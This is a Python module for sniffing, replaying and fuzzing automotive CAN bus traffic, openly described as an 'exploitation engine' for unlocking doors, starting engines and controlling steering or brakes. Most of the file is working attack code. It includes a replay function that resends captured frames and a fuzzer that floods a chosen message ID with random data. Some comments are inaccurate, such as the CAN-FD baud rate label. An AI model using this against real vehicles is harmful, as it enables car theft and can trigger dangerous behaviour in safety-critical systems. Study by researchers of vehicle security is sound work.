"""
CAN Bus Analyzer

Automotive Controller Area Network (CAN) bus reverse engineering and analysis.

Implements techniques for analyzing and exploiting automotive systems.

Based on "The Modern Hacker's Playbook" - Part 4.1: Automotive ECU & CAN Bus Hacking
"""

import logging
import time
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum


class CANFrameType(Enum):
    """CAN frame types"""
    DATA = "data"
    REMOTE = "remote"
    ERROR = "error"
    OVERLOAD = "overload"


@dataclass
class CANFrame:
    """CAN bus frame"""
    timestamp: float
    message_id: int
    data: bytes
    dlc: int  # Data Length Code
    extended: bool = False  # Extended ID


@dataclass
class CANSignal:
    """Identified CAN signal"""
    message_id: int
    name: str
    description: str
    action: str  # What action triggers this signal
    data_pattern: bytes


class CANBusAnalyzer:
    """
    CAN bus reverse engineering and exploitation engine.

    Modern vehicles contain dozens of ECUs communicating over CAN bus.
    This insecure, broadcast protocol can be exploited to:
    - Unlock doors
    - Start engine
    - Control steering/brakes
    - Access infotainment

    Workflow:
    1. Connect CAN-to-USB adapter to OBD-II port
    2. Sniff CAN traffic
    3. Correlate actions with messages
    4. Replay or craft malicious messages

    Example:
        >>> analyzer = CANBusAnalyzer(interface="can0")
        >>> analyzer.start_capture()
        >>> # Press "Unlock" button on key fob
        >>> frames = analyzer.get_frames(last_n=10)
        >>> unlock_signal = analyzer.correlate_action(frames, "unlock")
        >>> analyzer.replay(unlock_signal)  # Car unlocks!
    """

    def __init__(self, interface: str = "can0"):
        self.logger = logging.getLogger(__name__)
        self.interface = interface
        self.frames: List[CANFrame] = []
        self.identified_signals: Dict[int, CANSignal] = {}
        self.capturing = False

        # Check for python-can
        try:
            import can
            self.can_available = True
            self.can = can
        except ImportError:
            self.can_available = False
            self.logger.warning("python-can not available. Install: pip install python-can")

    def start_capture(self):
        """Start capturing CAN frames"""
        if not self.can_available:
            self.logger.error("python-can required")
            return

        self.logger.info(f"Starting capture on {self.interface}")

        try:
            self.bus = self.can.interface.Bus(
                channel=self.interface,
                bustype='socketcan'
            )
            self.capturing = True

        except Exception as e:
            self.logger.error(f"Failed to open CAN interface: {e}")
            self.logger.info("Ensure interface is up: sudo ip link set can0 up type can bitrate 500000")

    def stop_capture(self):
        """Stop capturing"""
        self.capturing = False
        if hasattr(self, 'bus'):
            self.bus.shutdown()

    def capture_frames(self, duration: float = 10.0) -> List[CANFrame]:
        """
        Capture CAN frames for a duration.

        Args:
            duration: Capture duration in seconds

        Returns:
            List of captured frames
        """
        if not self.can_available:
            return []

        frames = []
        start_time = time.time()

        self.logger.info(f"Capturing for {duration} seconds...")

        try:
            while time.time() - start_time < duration:
                msg = self.bus.recv(timeout=0.1)

                if msg:
                    frame = CANFrame(
                        timestamp=msg.timestamp,
                        message_id=msg.arbitration_id,
                        data=msg.data,
                        dlc=msg.dlc,
                        extended=msg.is_extended_id
                    )

                    frames.append(frame)
                    self.frames.append(frame)

        except Exception as e:
            self.logger.error(f"Capture error: {e}")

        self.logger.info(f"Captured {len(frames)} frames")
        return frames

    def correlate_action(self, action_name: str,
                        before_frames: Optional[List[CANFrame]] = None,
                        after_frames: Optional[List[CANFrame]] = None) -> Optional[CANSignal]:
        """
        Correlate a physical action with CAN messages.

        Workflow:
        1. Capture baseline traffic
        2. Perform action (e.g., press unlock button)
        3. Capture traffic during action
        4. Compare to find the difference

        Args:
            action_name: Name of action (e.g., "unlock_doors")
            before_frames: Frames before action
            after_frames: Frames during/after action

        Returns:
            Identified signal or None
        """
        self.logger.info(f"Correlating action: {action_name}")

        # Find messages that appear in "after" but not in "before"
        if not before_frames or not after_frames:
            return None

        before_ids = set(f.message_id for f in before_frames)
        after_ids = set(f.message_id for f in after_frames)

        # New message IDs
        new_ids = after_ids - before_ids

        if new_ids:
            # Found new message ID
            message_id = list(new_ids)[0]

            # Get the frame
            frame = next(f for f in after_frames if f.message_id == message_id)

            signal = CANSignal(
                message_id=message_id,
                name=action_name,
                description=f"Signal for {action_name}",
                action=action_name,
                data_pattern=frame.data
            )

            self.identified_signals[message_id] = signal
            self.logger.info(f"Identified signal: {action_name} = ID 0x{message_id:x}")

            return signal

        # Check for data changes in existing messages
        # (More sophisticated analysis)

        return None

    def replay(self, signal: CANSignal) -> bool:
        """
        Replay a CAN signal (replay attack).

        Args:
            signal: Signal to replay

        Returns:
            True if successful
        """
        if not self.can_available:
            return False

        self.logger.info(f"Replaying signal: {signal.name}")

        try:
            msg = self.can.Message(
                arbitration_id=signal.message_id,
                data=signal.data_pattern,
                is_extended_id=False
            )

            self.bus.send(msg)

            self.logger.info(f"Sent CAN message: ID 0x{signal.message_id:x}")
            return True

        except Exception as e:
            self.logger.error(f"Replay failed: {e}")
            return False

    def fuzz_message_id(self, message_id: int, iterations: int = 256):
        """
        Fuzz a CAN message ID by varying data bytes.

        Warning: This can cause unpredictable vehicle behavior!

        Args:
            message_id: CAN ID to fuzz
            iterations: Number of iterations
        """
        self.logger.warning("FUZZING CAN BUS - Use with extreme caution!")

        if not self.can_available:
            return

        for i in range(iterations):
            # Generate random data
            import random
            data = bytes([random.randint(0, 255) for _ in range(8)])

            try:
                msg = self.can.Message(
                    arbitration_id=message_id,
                    data=data
                )

                self.bus.send(msg)
                time.sleep(0.1)

            except Exception as e:
                self.logger.error(f"Fuzzing error: {e}")
                break

    def analyze_traffic(self) -> Dict[str, Any]:
        """
        Analyze captured CAN traffic.

        Returns:
            Analysis results
        """
        if not self.frames:
            return {}

        # Count messages by ID
        id_counts = {}
        for frame in self.frames:
            id_counts[frame.message_id] = id_counts.get(frame.message_id, 0) + 1

        # Most common IDs
        most_common = sorted(id_counts.items(), key=lambda x: x[1], reverse=True)[:10]

        analysis = {
            'total_frames': len(self.frames),
            'unique_ids': len(id_counts),
            'most_common_ids': [
                {'id': f"0x{id:x}", 'count': count}
                for id, count in most_common
            ],
            'time_span': self.frames[-1].timestamp - self.frames[0].timestamp if self.frames else 0,
        }

        return analysis

    def export_signals(self, output_file: str):
        """Export identified signals to file"""
        import json

        signals_data = {
            id: {
                'message_id': f"0x{signal.message_id:x}",
                'name': signal.name,
                'description': signal.description,
                'action': signal.action,
                'data_pattern': signal.data_pattern.hex()
            }
            for id, signal in self.identified_signals.items()
        }

        with open(output_file, 'w') as f:
            json.dump(signals_data, f, indent=2)

        self.logger.info(f"Exported {len(signals_data)} signals to {output_file}")


# Common CAN baud rates
CAN_BAUD_RATES = [
    125000,   # Low speed CAN
    250000,
    500000,   # High speed CAN (most common)
    1000000,  # CAN-FD
]

# Common automotive CAN IDs (examples)
COMMON_AUTOMOTIVE_IDS = {
    0x7DF: "OBD-II Functional Request",
    0x7E0: "Engine ECU",
    0x7E1: "Transmission ECU",
    0x7E2: "ABS/ESP ECU",
    0x7E3: "Airbag ECU",
}
